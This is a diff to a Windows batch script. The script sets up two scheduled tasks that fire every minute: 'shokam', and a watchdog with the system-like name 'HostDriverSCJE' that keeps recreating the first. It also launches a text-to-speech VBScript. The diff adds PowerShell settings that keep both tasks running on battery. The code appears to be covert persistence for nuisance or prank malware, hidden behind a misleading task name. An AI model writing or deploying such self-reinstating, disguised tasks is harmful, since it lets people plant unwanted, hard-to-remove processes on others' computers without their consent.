@@ -15,6 +15,8 @@ set "copyfile=%taskfolder%\%taskfilename%"
 set "schname=shokam"
 set "schhost=HostDriverSCJE"
 
+set "tasksettings=$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;"
+
 
 goto :MAIN
 
@@ -56,6 +58,7 @@ goto :MAIN
     echo     mkdir "%copyfolder%" >> "%driverfile%"
     echo     copy /Y "%taskfile%" "%copyfolder%\" >> "%driverfile%"
     echo     schtasks /create /tn "%schname%" /tr "%copyfolder%\%taskname%" /sc minute /mo 1 /st 00:00:00 /f >> "%driverfile%"
+    echo     powershell -command %tasksettings%"Set-ScheduledTask -TaskName %schname% -Settings $TaskSettings" >> "%driverfile%"
     echo     schtasks /run /tn "%schname%" >> "%driverfile%"
     echo ) >> "%driverfile%"
     exit /b
@@ -72,6 +75,7 @@ goto :MAIN
     echo task driver created
 
     schtasks /create /tn "%schhost%" /tr "%driverfile%" /sc minute /mo 1 /st 00:00:00 /f
+    powershell -command %tasksettings%"Set-ScheduledTask -TaskName %schhost% -Settings $TaskSettings"
     schtasks /run /tn "%schhost%"
 
     start wscript.exe "%ttsfile%"
